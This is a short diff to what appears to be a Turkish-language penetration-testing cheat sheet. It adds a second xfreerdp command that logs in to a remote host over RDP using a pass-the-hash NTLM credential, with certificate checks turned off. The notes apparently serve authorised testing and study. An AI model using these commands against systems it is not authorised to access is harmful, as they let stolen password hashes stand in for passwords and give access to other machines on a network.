@@ -111,3 +111,5 @@
 
 - **xFreeRDP Kullanımı:**  
   `xfreerdp /u:<Username> /pth:<NTLMHash> /d:<DomainName> /v:<Target>`
+  `xfreerdp +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>`
+
